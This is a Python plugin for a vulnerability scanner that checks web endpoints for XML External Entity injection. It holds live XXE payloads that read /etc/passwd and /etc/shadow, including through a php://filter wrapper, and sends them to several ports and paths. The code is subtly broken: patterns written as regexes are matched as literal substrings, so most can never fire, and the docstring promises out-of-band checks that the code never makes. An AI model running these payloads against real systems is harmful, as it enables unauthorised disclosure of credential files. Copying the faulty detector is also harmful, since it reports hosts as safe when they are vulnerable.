"""
Plugin 1119: XML External Entity (XXE) Injection Detection
============================================================
Detects XXE injection vulnerabilities by sending XML payloads with
DOCTYPE declarations that attempt to read /etc/passwd or trigger
out-of-band connections.
"""
import asyncio
import ssl

from plugins import NaslPlugin, PluginResult


class XxeDetection(NaslPlugin):
    PLUGIN_ID = 1119
    NAME = 'XML External Entity (XXE) Injection Detection'
    FAMILY = 'Web Applications'
    CVSS_SCORE = 9.1
    DESCRIPTION = (
        'Detects XML External Entity (XXE) injection vulnerabilities by sending '
        'XML payloads with DOCTYPE declarations that attempt to read /etc/passwd '
        'or trigger out-of-band connections. XXE can lead to sensitive file '
        'disclosure, SSRF, or denial of service.'
    )
    SOLUTION = (
        'Disable XML external entity processing. Use less complex data formats '
        'like JSON. Configure XML parsers to disable DTDs.'
    )
    CVE = []
    PORTS = [80, 443, 8080, 8443]

    XXE_PAYLOADS = [
        (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
            '<root>&xxe;</root>'
        ),
        (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]>'
            '<root>&xxe;</root>'
        ),
        (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]>'
            '<root>&xxe;</root>'
        ),
    ]

    ENDPOINTS = ['/', '/api', '/xml', '/api/xml', '/soap', '/ws']

    ETCPASSWD_PATTERNS = [
        b'root:.*:0:0:',
        b'daemon:.*:1:1:',
        b'nobody:',
        b'bin:.*:2:2:',
    ]

    async def check_target(self, target: str, port: int | None = None) -> list[PluginResult]:
        results = []

        for port_to_check in (self.PORTS if port is None else [port]):
            try:
                scheme = 'https' if port_to_check in (443, 8443) else 'http'
                ctx = None
                if scheme == 'https':
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE

                host_header = target
                if target in ('127.0.0.1', 'localhost', '::1'):
                    host_header = 'alieninc.tech'

                for xml_payload in self.XXE_PAYLOADS:
                    for endpoint in self.ENDPOINTS:
                        reader, writer = await asyncio.wait_for(
                            asyncio.open_connection(target, port_to_check, ssl=ctx),
                            timeout=5
                        )

                        req = (
                            f'POST {endpoint} HTTP/1.1\r\n'
                            f'Host: {host_header}\r\n'
                            f'Content-Type: application/xml\r\n'
                            f'Content-Length: {len(xml_payload)}\r\n'
                            f'User-Agent: Centra/1.0\r\n'
                            f'Connection: close\r\n\r\n'
                            f'{xml_payload}'
                        )
                        writer.write(req.encode())
                        await writer.drain()

                        response = b''
                        try:
                            while True:
                                chunk = await asyncio.wait_for(reader.read(4096), timeout=3)
                                if not chunk:
                                    break
                                response += chunk
                                if len(response) > 16384:
                                    break
                        except asyncio.TimeoutError:
                            pass

                        writer.close()
                        await writer.wait_closed()

                        for pattern in self.ETCPASSWD_PATTERNS:
                            if pattern in response:
                                results.append(PluginResult(
                                    vulnerable=True,
                                    target=target,
                                    port=port_to_check,
                                    cvss_score=self.CVSS_SCORE,
                                    severity='critical',
                                    description=f'XXE detected on endpoint {endpoint}',
                                    solution=self.SOLUTION,
                                    evidence=f'Endpoint: {endpoint}, file content pattern matched in response',
                                    references=[
                                        'https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing',
                                        'https://portswigger.net/web-security/xxe',
                                    ]
                                ))
                                break

                        if results:
                            break
                    if results:
                        break

            except (asyncio.TimeoutError, ConnectionRefusedError, OSError, ssl.SSLError):
                pass

        if not results:
            results.append(PluginResult(
                vulnerable=False, target=target, port=port or 0,
                description='No XXE indicators detected on checked ports'
            ))

        return results
